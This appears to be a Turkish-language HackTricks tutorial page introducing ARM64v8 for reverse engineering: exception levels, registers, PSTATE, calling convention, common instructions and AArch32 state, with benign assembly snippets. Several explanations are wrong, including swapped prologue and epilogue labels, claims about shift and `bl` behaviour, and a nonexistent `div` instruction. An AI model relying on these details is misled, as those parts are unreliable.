# ARM64v8'e Giriş

{{#include ../../../banners/hacktricks-training.md}}


## **Exception Levels - EL (ARM64v8)**

ARMv8 mimarisinde Exception Levels (EL) olarak bilinen execution seviyeleri, execution environment'ın privilege seviyesini ve yeteneklerini tanımlar. EL0'dan EL3'e kadar dört exception seviyesi vardır ve her biri farklı bir amaca hizmet eder:

1. **EL0 - User Mode**:
- En düşük privilege seviyesidir ve normal application code çalıştırmak için kullanılır.
- EL0'da çalışan application'lar birbirlerinden ve system software'dan izole edilir; bu da security ve stability'yi artırır.
2. **EL1 - Operating System Kernel Mode**:
- Çoğu operating system kernel'ı bu seviyede çalışır.
- EL1, EL0'dan daha fazla privilege'a sahiptir ve system resource'larına erişebilir; ancak system integrity'yi korumak için bazı kısıtlamalar bulunur. EL0'dan EL1'e `SVC` instruction'ı ile geçilir.
3. **EL2 - Hypervisor Mode**:
- Bu seviye virtualization için kullanılır. EL2'de çalışan bir hypervisor, aynı physical hardware üzerinde çalışan birden fazla operating system'ı (her biri kendi EL1 seviyesinde) yönetebilir.
- EL2, virtualized environment'ların izolasyonu ve kontrolü için özellikler sağlar.
- Bu nedenle Parallels gibi virtual machine application'ları, kernel extension'larına ihtiyaç duymadan EL2 ile etkileşim kurmak ve virtual machine çalıştırmak için `hypervisor.framework` kullanabilir.
- EL1'den EL2'ye geçmek için `HVC` instruction'ı kullanılır.
4. **EL3 - Secure Monitor Mode**:
- En yüksek privilege seviyesidir ve genellikle secure booting ile trusted execution environment'lar için kullanılır.
- EL3, secure ve non-secure state'ler arasındaki erişimleri yönetebilir ve kontrol edebilir (secure boot, trusted OS vb.).
- macOS'ta KPP (Kernel Patch Protection) için kullanılıyordu, ancak artık kullanılmıyor.
- EL3 artık Apple tarafından kullanılmıyor.
- EL3'e geçiş genellikle `SMC` (Secure Monitor Call) instruction'ı kullanılarak gerçekleştirilir.

Bu seviyelerin kullanılması, user application'larından en yüksek privilege'a sahip system software'a kadar system'in farklı bölümlerini yönetmek için yapılandırılmış ve güvenli bir yöntem sağlar. ARMv8'in privilege seviyelerine yaklaşımı, farklı system component'larını etkili biçimde izole ederek system'in security ve robustness özelliklerini artırır.

## **Registers (ARM64v8)**

ARM64'te `x0` ile `x30` arasında adlandırılmış **31 general-purpose register** bulunur. Her biri **64-bit** (8-byte) değer saklayabilir. Yalnızca 32-bit değer gerektiren operation'lar için aynı register'lara w0 ile w30 adları kullanılarak 32-bit mode'da erişilebilir.

1. **`x0`** ile **`x7`** - Bunlar genellikle scratch register olarak ve subroutine'lere parameter geçirmek için kullanılır.
- **`x0`** ayrıca bir function'ın return data'sını taşır
2. **`x8`** - Linux kernel'da `x8`, `svc` instruction'ı için system call number olarak kullanılır. **macOS'ta kullanılan register x16'dır!**
3. **`x9`** ile **`x15`** - Daha fazla temporary register; çoğunlukla local variable'lar için kullanılır.
4. **`x16`** ve **`x17`** - **Intra-procedural Call Registers**. Immediate value'lar için temporary register'lardır. Ayrıca indirect function call'ları ve PLT (Procedure Linkage Table) stub'larını için kullanılırlar.
- **`x16`**, macOS'ta **`svc`** instruction'ı için **system call number** olarak kullanılır.
5. **`x18`** - **Platform register**. General-purpose register olarak kullanılabilir; ancak bazı platformlarda platforma özel kullanımlar için ayrılmıştır: Windows'ta current thread environment block'a pointer veya **Linux kernel'da o anda çalışan task structure'ını göstermek** için kullanılır.
6. **`x19`** ile **`x28`** - Bunlar callee-saved register'lardır. Bir function, caller'ı için bu register'ların değerlerini korumalıdır; bu nedenle değerler stack'te saklanır ve caller'a dönmeden önce geri yüklenir.
7. **`x29`** - Stack frame'i takip etmek için kullanılan **frame pointer**'dır. Bir function çağrıldığı için yeni bir stack frame oluşturulduğunda **`x29` register'ı stack'te saklanır** ve **yeni** frame pointer address'i (**`sp`** address'i) bu register'a **saklanır**.
- Bu register aynı zamanda **general-purpose register** olarak kullanılabilir; ancak genellikle **local variable**'lara referans olarak kullanılır.
8. **`x30`** veya **`lr`** - **Link register**. Bir `BL` (Branch with Link) veya `BLR` (Branch with Link to Register) instruction'ı çalıştırıldığında **`pc`** değerini bu register'a kaydederek **return address**'i tutar.
- Diğer register'lar gibi kullanılabilir.
- Current function yeni bir function çağıracaksa ve bu nedenle `lr`'ı overwrite edecekse, başlangıçta onu stack'e kaydeder; bu epilogue'dur (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> `fp` ve `lr`'ı sakla, alan oluştur ve yeni `fp`'yi al) ve sonunda geri yükler; bu da prologue'dur (`ldp x29, x30, [sp], #48; ret` -> `fp` ve `lr`'ı geri yükle ve return et).
9. **`sp`** - Stack'in tepesini takip etmek için kullanılan **stack pointer**.
- **`sp`** değeri her zaman en az **quadword** **alignment**'ı korunacak şekilde tutulmalıdır; aksi halde bir alignment exception oluşabilir.
10. **`pc`** - Bir sonraki instruction'ı gösteren **program counter**. Bu register yalnızca exception generation'ları, exception return'leri ve branch'ler aracılığıyla güncellenebilir. Bu register'ı okuyabilen tek ordinary instruction'lar, **`pc`** address'ini **`lr`**'a (Link Register) kaydetmek için kullanılan branch with link instruction'larıdır (BL, BLR).
11. **`xzr`** - **Zero register**. 32-bit register formunda **`wzr`** olarak da adlandırılır. Sıfır değerini kolayca elde etmek (yaygın bir operation) veya **`subs`** kullanarak comparison gerçekleştirmek için kullanılabilir; örneğin **`subs XZR, Xn, #10`**, elde edilen data'yı hiçbir yere saklamaz (**`xzr`** içine).

**`Wn`** register'ları, **`Xn`** register'larının **32-bit** sürümüdür.

> [!TIP]
> X0 - X18 arasındaki register'lar volatile'dır; bu, değerlerinin function call'ları ve interrupt'lar tarafından değiştirilebileceği anlamına gelir. Buna karşılık X19 - X28 arasındaki register'lar non-volatile'dır; yani değerleri function call'ları boyunca korunmalıdır ("callee saved").

### SIMD ve Floating-Point Registers

Bunlara ek olarak, optimized single instruction multiple data (SIMD) operation'larında ve floating-point arithmetic gerçekleştirmede kullanılabilen **128-bit uzunluğunda 32 register** daha vardır. Bunlara Vn register'ları denir; ancak bu register'lar **64**-bit, **32**-bit, **16**-bit ve **8**-bit olarak da çalışabilir ve bu durumda **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** ve **`Bn`** olarak adlandırılırlar.

### System Registers

**Yüzlerce system register** bulunur; special-purpose register (SPR) olarak da adlandırılan bu register'lar **processor** davranışını **izlemek** ve **kontrol etmek** için kullanılır.\
Yalnızca dedicated special instruction olan **`mrs`** ve **`msr`** kullanılarak okunabilir veya ayarlanabilirler.

**`TPIDR_EL0`** ve **`TPIDDR_EL0`** special register'larına reverse engineering sırasında sıkça rastlanır. `EL0` suffix'i, register'a erişilebilen **minimum exception** seviyesini gösterir (bu durumda EL0, regular program'ların çalıştığı regular exception (privilege) seviyesidir).\
Bu register'lar çoğunlukla thread-local storage memory region'ının **base address**'ini saklamak için kullanılır. Genellikle ilki EL0'da çalışan programlar tarafından okunabilir ve yazılabilir; ikincisi ise EL0'dan okunabilir ve EL1'den (kernel gibi) yazılabilir.

- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`

### **PSTATE**

**PSTATE**, çeşitli process component'larını operating-system-visible **`SPSR_ELx`** special register'ında serialize edilmiş biçimde içerir; buradaki X, tetiklenen exception'ın **permission** **level**'ını belirtir (bu, exception sona erdiğinde process state'in geri yüklenmesini sağlar).\
Erişilebilen field'lar şunlardır:

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- **`N`**, **`Z`**, **`C`** ve **`V`** condition flag'leri:
- **`N`**, operation'ın negatif bir sonuç ürettiği anlamına gelir
- **`Z`**, operation'ın sıfır ürettiği anlamına gelir
- **`C`**, operation'ın carry ürettiği anlamına gelir
- **`V`**, operation'ın signed overflow ürettiği anlamına gelir:
- İki pozitif sayının toplamı negatif bir sonuç üretir.
- İki negatif sayının toplamı pozitif bir sonuç üretir.
- Subtraction işleminde, büyük bir negatif sayı daha küçük bir pozitif sayıdan (veya tersi) çıkarıldığında ve sonuç verilen bit size aralığında temsil edilemediğinde.
- Processor operation'ın signed veya unsigned olduğunu kendiliğinden bilmez; bu nedenle operation'larda C ve V'yi kontrol eder ve signed veya unsigned olması durumunda carry oluşup oluşmadığını belirtir.

> [!WARNING]
> Tüm instruction'lar bu flag'leri güncellemez. **`CMP`** veya **`TST`** gibi bazıları günceller; `s` suffix'ine sahip **`ADDS`** gibi diğerleri de bunu yapar.

- Current **register width (`nRW`) flag'i**: Flag 0 değerini taşıyorsa program, resume edildiğinde AArch64 execution state'inde çalışır.
- Current **Exception Level** (**`EL`**): EL0'da çalışan regular bir program 0 değerine sahip olur
- **Single stepping** flag'i (**`SS`**): Debugger'lar tarafından single step gerçekleştirmek için kullanılır; bir exception aracılığıyla **`SPSR_ELx`** içindeki SS flag'i 1 olarak ayarlanır. Program bir step çalıştırır ve single step exception üretir.
- **Illegal exception** state flag'i (**`IL`**): Privileged software geçersiz bir exception level transferi gerçekleştirdiğinde bunu işaretlemek için kullanılır; bu flag 1 olarak ayarlanır ve processor illegal state exception tetikler.
- **`DAIF`** flag'leri: Bu flag'ler, privileged bir programın belirli external exception'ları seçerek mask'lemesini sağlar.
- **`A`** 1 ise **asynchronous abort**'ların tetikleneceği anlamına gelir. **`I`**, external hardware **Interrupt Request**'lerine (IRQ) yanıt verilmesini yapılandırır. F ise **Fast Interrupt Request**'lerle (FIR) ilgilidir.
- **Stack pointer select** flag'leri (**`SPS`**): EL1 ve üzeri seviyelerde çalışan privileged program'lar, kendi stack pointer register'larını kullanmak ile user-model register'ını kullanmak arasında geçiş yapabilir (ör. `SP_EL1` ile `EL0` arasında). Bu switching, **`SPSel`** special register'ına yazılarak gerçekleştirilir. Bu işlem EL0'dan yapılamaz.

## **Calling Convention (ARM64v8)**

ARM64 calling convention'ı, bir function'ın **ilk sekiz parameter'ının** **`x0`** ile **`x7`** arasındaki register'larda geçirilmesini belirtir. **Ek** parameter'lar **stack** üzerinde geçirilir. **Return** değeri **`x0`** register'ında; değer **128 bit uzunluğundaysa** ayrıca **`x1`** register'ında geçirilir. **`x19`** ile **`x30`** arasındaki register'lar ve **`sp`** register'ı function call'ları boyunca **korunmalıdır**.

Assembly'de bir function okurken **function prologue** ve **epilogue**'u arayın. **Prologue** genellikle **frame pointer'ı (`x29`) kaydetmeyi**, **yeni bir frame pointer ayarlamayı** ve **stack alanı ayırmayı** içerir. **Epilogue** ise genellikle kaydedilmiş frame pointer'ın **geri yüklenmesini** ve function'dan **return edilmesini** içerir.

### Swift'te Calling Convention

Swift'in, [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64) adresinde bulunabilen kendine ait bir **calling convention**'ı vardır.

## **Common Instructions (ARM64v8)**

ARM64 instruction'ları genel olarak **`opcode dst, src1, src2`** formatına sahiptir; burada **`opcode`**, gerçekleştirilecek operation'ı (`add`, `sub`, `mov` vb.), **`dst`** sonucun saklanacağı **destination** register'ını, **`src1`** ve **`src2`** ise **source** register'larını belirtir. Source register'ları yerine immediate value'lar da kullanılabilir.

- **`mov`**: Bir register'daki değeri başka bir register'a **taşır**.
- Örnek: `mov x0, x1` — `x1` içindeki değeri `x0`'a taşır.
- **`ldr`**: Bir değeri **memory**'den **register**'a **yükler**.
- Örnek: `ldr x0, [x1]` — `x1` tarafından gösterilen memory location'daki değeri `x0`'a yükler.
- **Offset mode**: Origin pointer'ı etkileyen bir offset şu şekilde belirtilir:
- `ldr x2, [x1, #8]`, bu instruction x1 + 8'deki değeri x2'ye yükler
- `ldr x2, [x0, x1, lsl #2]`, bu instruction x0 array'inden x1 (index) \* 4 konumundaki bir object'i x2'ye yükler
- **Pre-indexed mode**: Calculation'ları origin'e uygular, sonucu alır ve yeni origin'i origin'e kaydeder.
- `ldr x2, [x1, #8]!`, bu instruction `x1 + 8` değerini `x2`'ye yükler ve `x1` içine `x1 + 8` sonucunu kaydeder
- `str lr, [sp, #-4]!`, link register'ı sp'ye kaydeder ve sp register'ını günceller
- **Post-index mode**: Önceki mode'a benzer; ancak memory address'e erişilir, ardından offset hesaplanır ve kaydedilir.
- `ldr x0, [x1], #8`, x1'i x0'a yükler ve x1'i `x1 + 8` ile günceller
- **PC-relative addressing**: Bu durumda yüklenecek address, PC register'ına göre relative olarak hesaplanır
- `ldr x1, =_start`, `_start` symbol'ının başladığı address'i current PC'ye göre x1'e yükler.
- **`str`**: Bir register'daki değeri **memory**'ye **kaydeder**.
- Örnek: `str x0, [x1]` — `x0` içindeki değeri `x1` tarafından gösterilen memory location'a kaydeder.
- **`ldp`**: **Load Pair of Registers**. Bu instruction, **consecutive memory** location'larından **iki register** yükler. Memory address genellikle başka bir register'daki değere offset eklenerek oluşturulur.
- Örnek: `ldp x0, x1, [x2]` — `x0` ve `x1`'i sırasıyla `x2` ve `x2 + 8` memory location'larından yükler.
- **`stp`**: **Store Pair of Registers**. Bu instruction, **iki register'ı** **consecutive memory** location'larına kaydeder. Memory address genellikle başka bir register'daki değere offset eklenerek oluşturulur.
- Örnek: `stp x0, x1, [sp]` — `x0` ve `x1`'i sırasıyla `sp` ve `sp + 8` memory location'larına kaydeder.
- `stp x0, x1, [sp, #16]!` — `x0` ve `x1`'i sırasıyla `sp+16` ve `sp + 24` memory location'larına kaydeder ve `sp`'yi `sp+16` ile günceller.
- **`add`**: İki register'ın değerlerini **toplar** ve sonucu bir register'a kaydeder.
- Syntax: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Destination
- Xn2 -> Operand 1
- Xn3 | #imm -> Operand 2 (register veya immediate)
- \[shift #N | RRX] -> Bir shift gerçekleştir veya RRX çağır
- Örnek: `add x0, x1, x2` — `x1` ve `x2` değerlerini toplar ve sonucu `x0`'a kaydeder.
- `add x5, x5, #1, lsl #12` — Bu, 4096'ya eşittir (1'in 12 kez shift edilmesi) -> 1 0000 0000 0000 0000
- **`adds`** Bir `add` gerçekleştirir ve flag'leri günceller
- **`sub`**: İki register'ın değerlerini **çıkarır** ve sonucu bir register'a kaydeder.
- **`add`** **syntax**'ına bakın.
- Örnek: `sub x0, x1, x2` — `x2` değerini `x1`'den çıkarır ve sonucu `x0`'a kaydeder.
- **`subs`** `sub` gibidir, ancak flag'i günceller
- **`mul`**: **İki register'ın** değerlerini **çarpar** ve sonucu bir register'a kaydeder.
- Örnek: `mul x0, x1, x2` — `x1` ve `x2` değerlerini çarpar ve sonucu `x0`'a kaydeder.
- **`div`**: Bir register'ın değerini diğeriyle **böler** ve sonucu bir register'a kaydeder.
- Örnek: `div x0, x1, x2` — `x1` değerini `x2`'ye böler ve sonucu `x0`'a kaydeder.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
- **Logical shift left**: Sondan 0'lar ekleyerek diğer bitleri ileri taşır (n kez 2 ile çarpma)
- **Logical shift right**: Başlangıca 1'ler ekleyerek diğer bitleri geri taşır (unsigned durumda n kez 2'ye bölme)
- **Arithmetic shift right**: **`lsr`** gibidir; ancak en anlamlı bit 1 ise 0 eklemek yerine **1'ler eklenir** (signed durumda n kez 2'ye bölme)
- **Rotate right**: **`lsr`** gibidir; ancak sağdan çıkarılan bitler sola eklenir
- **Rotate Right with Extend**: **`ror`** gibidir, ancak carry flag "en anlamlı bit" olarak kullanılır. Böylece carry flag bit 31'e, çıkarılan bit ise carry flag'e taşınır.
- **`bfm`**: **Bit Field Move**; bu operation'lar bir değerdeki **`0...n` bit'lerini kopyalar** ve **`m..m+n`** konumlarına yerleştirir. **`#s`**, **en soldaki bit** konumunu; **`#r`** ise **rotate right miktarını** belirtir.
- Bitfield move: `BFM Xd, Xn, #r`
- Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
- Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
- **Bitfield Extract and Insert:** Bir register'dan bitfield kopyalar ve başka bir register'a kopyalar.
- **`BFI X1, X2, #3, #4`** X2'den 4 biti alır ve X1'deki 3. bitten başlayarak yerleştirir
- **`BFXIL X1, X2, #3, #4`** X2'nin 3. bitinden dört bit çıkarır ve bunları X1'e kopyalar
- **`SBFIZ X1, X2, #3, #4`** X2'den 4 biti sign-extend eder ve sağ bitleri sıfırlayarak bit position 3'ten başlayarak X1'e yerleştirir
- **`SBFX X1, X2, #3, #4`** X2'de bit 3'ten başlayan 4 biti çıkarır, sign-extend eder ve sonucu X1'e yerleştirir
- **`UBFIZ X1, X2, #3, #4`** X2'den 4 biti zero-extend eder ve sağ bitleri sıfırlayarak bit position 3'ten başlayarak X1'e yerleştirir
- **`UBFX X1, X2, #3, #4`** X2'de bit 3'ten başlayan 4 biti çıkarır ve zero-extend edilmiş sonucu X1'e yerleştirir.
- **Sign Extend To X:** Bir değer üzerinde operation gerçekleştirebilmek için sign'ı (veya unsigned sürümde yalnızca 0'lar ekleyerek) genişletir:
- **`SXTB X1, W2`** 64 bit'i doldurmak için **W2'deki bir byte'ın sign'ını W2'den X1'e** genişletir (`W2`, `X2`'nin yarısıdır)
- **`SXTH X1, W2`** 64 bit'i doldurmak için **W2'deki 16-bit sayının sign'ını W2'den X1'e** genişletir
- **`SXTW X1, W2`** 64 bit'i doldurmak için **W2'deki bir byte'ın sign'ını W2'den X1'e** genişletir
- **`UXTB X1, W2`** 64 bit'i doldurmak için **W2'deki bir byte'a 0'lar (unsigned) ekleyerek W2'den X1'e** taşır
- **`extr`:** Belirtilen **birleştirilmiş register çifti** içinden bitleri çıkarır.
- Örnek: `EXTR W3, W2, W1, #3` **W1+W2'yi birleştirir**, W2'nin 3. bitinden W1'in 3. bitine kadar olan kısmı alır ve W3'e kaydeder.
- **`cmp`**: İki register'ı **karşılaştırır** ve condition flag'lerini ayarlar. Destination register'ını zero register'a ayarlayan bir **`subs` alias**'ıdır. `m == n` durumunu öğrenmek için kullanışlıdır.
- **`subs`** ile aynı syntax'ı destekler
- Örnek: `cmp x0, x1` — `x0` ve `x1` değerlerini karşılaştırır ve condition flag'lerini uygun şekilde ayarlar.
- **`cmn`**: **Compare negative** operand. Bu durumda **`adds` alias**'ıdır ve aynı syntax'ı destekler. `m == -n` durumunu öğrenmek için kullanışlıdır.
- **`ccmp`**: Conditional comparison; yalnızca önceki comparison doğruysa gerçekleştirilen ve nzcv bit'lerini özel olarak ayarlayan bir comparison'dır.
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> x1 != x2 ve x3 < x4 ise func'a atlar
- Bunun nedeni, **`ccmp`**'nin yalnızca **önceki `cmp` bir `NE` ise** çalıştırılmasıdır; değilse `nzcv` bit'leri 0 olarak ayarlanır (bu da `blt` comparison'ını karşılamaz).
- Bu işlem `ccmn` olarak da kullanılabilir (`cmp` ile `cmn` arasındaki fark gibi, ancak negative).
- **`tst`**: Comparison değerlerinden herhangi ikisinin de 1 olup olmadığını kontrol eder (sonucu hiçbir yere kaydetmeden ANDS gibi çalışır). Bir register'ı bir değerle kontrol etmek ve değerde belirtilen register bit'lerinden herhangi birinin 1 olup olmadığını öğrenmek için kullanışlıdır.
- Örnek: `tst X1, #7` X1'in son 3 bitinden herhangi birinin 1 olup olmadığını kontrol eder
- **`teq`**: Sonucu discard ederek XOR operation'ı gerçekleştirir
- **`b`**: Unconditional Branch
- Örnek: `b myFunction`
- Bunun link register'ını return address ile doldurmayacağını unutmayın (geri dönmesi gereken subroutine call'ları için uygun değildir)
- **`bl`**: Link ile **Branch**; bir **subroutine**'i **çağırmak** için kullanılır. **Return address'i `x30`** içine kaydeder.
- Örnek: `bl myFunction` — `myFunction` function'ını çağırır ve return address'i `x30` içine kaydeder.
- Bunun link register'ını return address ile doldurmayacağını unutmayın (geri dönmesi gereken subroutine call'ları için uygun değildir)
- **`blr`**: Link to Register ile **Branch**; target'ın bir **register**'da belirtildiği bir **subroutine**'i **çağırmak** için kullanılır. Return address'i `x30` içine kaydeder. (Bu
- Örnek: `blr x1` — address'i `x1` içinde bulunan function'ı çağırır ve return address'i `x30` içine kaydeder.
- **`ret`**: Genellikle **`x30`** içindeki address'i kullanarak **subroutine**'den **return** eder.
- Örnek: `ret` — `x30` içindeki return address'i kullanarak current subroutine'den return eder.
- **`b.<cond>`**: Conditional branch'ler
- **`b.eq`**: Önceki `cmp` instruction'ına göre **eşitse branch** eder.
- Örnek: `b.eq label` — Önceki `cmp` instruction'ı iki eşit değer bulduysa `label`'a atlar.
- **`b.ne`**: **Eşit değilse Branch** eder. Bu instruction condition flag'lerini (önceki bir comparison instruction'ı tarafından ayarlanmıştır) kontrol eder ve karşılaştırılan değerler eşit değilse bir label veya address'e branch eder.
- Örnek: `cmp x0, x1` instruction'ından sonra `b.ne label` — `x0` ve `x1` değerleri eşit değilse `label`'a atlar.
- **`cbz`**: **Compare and Branch on Zero**. Bu instruction bir register'ı zero ile karşılaştırır; eşitse bir label veya address'e branch eder.
- Örnek: `cbz x0, label` — `x0` değeri zero ise `label`'a atlar.
- **`cbnz`**: **Compare and Branch on Non-Zero**. Bu instruction bir register'ı zero ile karşılaştırır; eşit değilse bir label veya address'e branch eder.
- Örnek: `cbnz x0, label` — `x0` değeri zero değilse `label`'a atlar.
- **`tbnz`**: Bit'i test eder ve nonzero ise branch eder
- Örnek: `tbnz x0, #8, label`
- **`tbz`**: Bit'i test eder ve zero ise branch eder
- Örnek: `tbz x0, #8, label`
- **Conditional select operations**: Davranışları conditional bit'lere göre değişen operation'lardır.
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Doğruysa X0 = X1, yanlışsa X0 = X2
- `csinc Xd, Xn, Xm, cond` -> Doğruysa Xd = Xn, yanlışsa Xd = Xm + 1
- `cinc Xd, Xn, cond` -> Doğruysa Xd = Xn + 1, yanlışsa Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> Doğruysa Xd = Xn, yanlışsa Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> Doğruysa Xd = NOT(Xn), yanlışsa Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> Doğruysa Xd = Xn, yanlışsa Xd = - Xm
- `cneg Xd, Xn, cond` -> Doğruysa Xd = - Xn, yanlışsa Xd = Xn
- `cset Xd, Xn, Xm, cond` -> Doğruysa Xd = 1, yanlışsa Xd = 0
- `csetm Xd, Xn, Xm, cond` -> Doğruysa Xd = \<all 1>, yanlışsa Xd = 0
- **`adrp`**: Bir **symbol'ün page address**'ini hesaplar ve bir register'a kaydeder.
- Örnek: `adrp x0, symbol` — `symbol`'ün page address'ini hesaplar ve `x0`'a kaydeder.
- **`ldrsw`**: Memory'den signed **32-bit** bir değer **yükler** ve bunu **64** bit'e sign-extend eder. Yaygın SWITCH case'leri için kullanılır.
- Örnek: `ldrsw x0, [x1]` — `x1` tarafından gösterilen memory location'dan signed 32-bit bir değer yükler, bunu 64 bit'e sign-extend eder ve `x0`'a kaydeder.
- **`stur`**: Başka bir register'dan alınan offset'i kullanarak bir register değerini bir memory location'a **kaydeder**.
- Örnek: `stur x0, [x1, #4]` — `x0` içindeki değeri, current `x1` address'inden 4 byte daha büyük olan memory address'e kaydeder.
- **`svc`**: **System call** gerçekleştirir. "Supervisor Call" ifadesinin kısaltmasıdır. Processor bu instruction'ı çalıştırdığında **user mode'dan kernel mode'a geçer** ve **kernel'ın system call handling** code'unun bulunduğu memory'deki belirli bir konuma atlar.

- Örnek:

```armasm
mov x8, 93  ; Load the system call number for exit (93) into register x8.
mov x0, 0   ; Load the exit status code (0) into register x0.
svc 0       ; Make the system call.
```

### **Function Prologue**

1. **Link register'ı ve frame pointer'ı stack'e kaydetme**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **Yeni frame pointer'ı ayarlama**: `mov x29, sp` (mevcut function için yeni frame pointer'ı ayarlar)
3. **Local variable'lar için stack üzerinde alan ayırma** (gerekiyorsa): `sub sp, sp, <size>` (`<size>` gereken byte sayısıdır)

### **Function Epilogue**

1. **Local variable'lar için ayrılan alanı serbest bırakma**: `add sp, sp, <size>`
2. **Link register'ı ve frame pointer'ı geri yükleme**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Return**: `ret` (link register içindeki adresi kullanarak kontrolü caller'a geri döndürür)

## ARM Common Memory Protections

{{#ref}}
../../../binary-exploitation/ios-exploiting/README.md
{{#endref}}

## AARCH32 Çalışma Durumu

Armv8-A, 32-bit programların çalıştırılmasını destekler. **AArch32**, **`A32`** ve **`T32`** olmak üzere **iki instruction set'ten** birinde çalışabilir ve bunlar arasında **`interworking`** aracılığıyla geçiş yapabilir.\
**Privileged** 64-bit programlar, daha düşük yetkili 32-bit **exception level'a** geçiş gerçekleştirerek **32-bit programların çalıştırılmasını** planlayabilir.\
64-bit'ten 32-bit'e geçişin exception level'ın düşürülmesiyle gerçekleştiğine dikkat edin (örneğin EL1'deki 64-bit bir programın EL0'da bir programı tetiklemesi). Bu işlem, **`AArch32`** process thread'i çalıştırılmaya hazır olduğunda **`SPSR_ELx`** özel register'ının **4. bitinin** **1** olarak ayarlanmasıyla gerçekleştirilir; `SPSR_ELx`'in geri kalanı ise **`AArch32`** programının CPSR'sini saklar. Ardından privileged process, processor'ın **`AArch32`**'e geçmesini ve CPSR**'ye bağlı olarak A32 veya T32'ye girmesini sağlamak için **`ERET`** instruction'ını çağırır.**

**`interworking`**, CPSR'nin J ve T bitleri kullanılarak gerçekleşir. `J=0` ve `T=0`, **`A32`** anlamına gelir; `J=0` ve `T=1` ise **T32** anlamına gelir. Bu, instruction set'in T32 olduğunu belirtmek için temel olarak **en düşük bitin 1 olarak ayarlanması** şeklinde ifade edilir.\
Bu ayarlama **`interworking` branch instruction'ları** sırasında yapılır; ancak PC'nin destination register olarak ayarlandığı diğer instruction'larla da doğrudan yapılabilir. Örnek:

Başka bir örnek:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Registerler

16 adet 32-bit register (`r0-r15`) bulunur. **`r0` ile `r14` arasındaki registerler** **herhangi bir işlem** için kullanılabilir; ancak bazıları genellikle ayrılmıştır:

- **`r15`**: Program counter (her zaman). Bir sonraki instruction'ın adresini içerir. A32'de mevcut + 8, T32'de mevcut + 4.
- **`r11`**: Frame Pointer
- **`r12`**: Intra-procedural call register
- **`r13`**: Stack Pointer (Stack'in her zaman 16-byte hizalı olduğuna dikkat edin)
- **`r14`**: Link Register

Ayrıca registerler, **`banked registries`** tarafından yedeklenir. Bunlar, exception handling ve privileged operations sırasında **hızlı context switching** gerçekleştirmeyi sağlayan register değerlerini depolayan alanlardır; böylece registerleri her seferinde manuel olarak kaydetme ve geri yükleme ihtiyacı ortadan kalkar.\
Bu işlem, **`CPSR` içindeki processor state'in**, exception'ın alındığı processor mode'a ait **`SPSR`'ye kaydedilmesiyle** gerçekleştirilir. Exception'dan dönüldüğünde **`CPSR`**, **`SPSR`'den** geri yüklenir.

### CPSR - Current Program Status Register

AArch32'de CPSR, AArch64'teki **`PSTATE`** ile benzer şekilde çalışır ve execution'ı daha sonra geri yüklemek üzere bir exception alındığında **`SPSR_ELx`** içinde de saklanır:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

Alanlar bazı gruplara ayrılır:

- Application Program Status Register (APSR): Arithmetic flags; EL0'dan erişilebilir
- Execution State Registers: Process davranışı (OS tarafından yönetilir).

#### Application Program Status Register (APSR)

- **`N`**, **`Z`**, **`C`**, **`V`** flag'leri (AArch64'teki gibi)
- **`Q`** flag'i: Specialized saturating arithmetic instruction'ın execution'ı sırasında **integer saturation** gerçekleştiğinde 1 olarak ayarlanır. **`1`** olarak ayarlandıktan sonra manuel olarak 0'a ayarlanana kadar bu değeri korur. Ayrıca değerini implicit olarak kontrol eden herhangi bir instruction yoktur; manuel olarak okunması gerekir.
- **`GE`** (Greater than or equal) flag'leri: "parallel add" ve "parallel subtract" gibi SIMD (Single Instruction, Multiple Data) operation'larında kullanılır. Bu operation'lar, tek bir instruction içinde birden fazla data noktasının işlenmesini sağlar.

Örneğin **`UADD8`** instruction'ı, iki adet 32-bit operand'dan **dört byte çiftini** parallel olarak toplar ve sonuçları bir 32-bit register'da saklar. Ardından bu sonuçlara göre **APSR içindeki `GE` flag'lerini ayarlar**. Her GE flag'i, byte toplama işlemlerinden birine karşılık gelir ve ilgili byte çiftinin toplamasında **overflow oluşup oluşmadığını** belirtir.

**`SEL`** instruction'ı, koşullu işlemler gerçekleştirmek için bu GE flag'lerini kullanır.

#### Execution State Registers

- **`J`** ve **`T`** bit'leri: **`J`** 0 olmalıdır; **`T`** 0 ise A32 instruction set'i, 1 ise T32 kullanılır.
- **IT Block State Register** (`ITSTATE`): Bunlar 10-15 ve 25-26. bitleridir. **`IT`** prefix'iyle başlayan bir grup içindeki instruction'ların koşullarını depolarlar.
- **`E`** biti: **Endianness**'i belirtir.
- **Mode and Exception Mask Bits** (0-4): Mevcut execution state'i belirler. **5. bit**, programın 32-bit (1) veya 64-bit (0) olarak çalışıp çalışmadığını belirtir. Diğer 4 bit, **şu anda kullanılan exception mode**'unu temsil eder (bir exception oluştuğunda ve işlenirken). Ayarlanan sayı, bu exception işlenirken başka bir exception tetiklenmesi durumundaki **mevcut priority**'yi belirtir.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

